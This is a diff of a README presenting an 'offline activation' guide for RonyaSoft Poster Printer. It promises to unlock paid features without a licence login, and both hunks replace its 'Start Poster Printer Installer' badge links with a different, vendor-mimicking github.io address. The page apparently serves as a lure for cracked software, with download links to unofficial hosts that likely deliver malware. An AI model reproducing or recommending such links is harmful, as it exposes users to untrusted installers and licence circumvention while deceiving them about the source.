@@ -1,6 +1,6 @@
 # RonyaSoft Poster Printer — Offline Activation Guide
 
-[![🖨️ Start Poster Printer Installer](https://img.shields.io/badge/🖨️%20Start%20Poster%20Printer%20Installer-Launch%20Offline%20Setup-%235d6d7e?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/RSPPSAD)
+[![🖨️ Start Poster Printer Installer](https://img.shields.io/badge/🖨️%20Start%20Poster%20Printer%20Installer-Launch%20Offline%20Setup-%235d6d7e?style=for-the-badge)](https://ronyasoft-poster-printer-download.github.io/.github)
 
 > Complete offline setup for RonyaSoft Poster Printer. Unlock large-format printing, poster tiling, and page scaling features with no internet or license login.
 
@@ -37,7 +37,7 @@
 ![Classic Interface View](https://th.bing.com/th/id/R.b2a73a96013d1b9ee268f8b70a23be49?rik=E6czNQQO44xN1w&riu=http%3a%2f%2f4.bp.blogspot.com%2f-SsmQ4FlORew%2fTVWGbqwoPeI%2fAAAAAAAAAFY%2fX-tP9EdhTjU%2fs1600%2fRonyaSoft%2bPoster%2bPrinter%2bv3.01.12.jpg&ehk=g7LB0nD%2ftiB3gF%2f75j2uJLDdXvyM2lnFK4tZq8nO%2b9s%3d&risl=&pid=ImgRaw&r=0)  
 *Simple classic interface with print preview and border control*
 
-[![🖨️ Start Poster Printer Installer](https://img.shields.io/badge/🖨️%20Start%20Poster%20Printer%20Installer-Launch%20Offline%20Setup-%235d6d7e?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/RSPPSAD)
+[![🖨️ Start Poster Printer Installer](https://img.shields.io/badge/🖨️%20Start%20Poster%20Printer%20Installer-Launch%20Offline%20Setup-%235d6d7e?style=for-the-badge)](https://ronyasoft-poster-printer-download.github.io/.github)
 
 ---
 
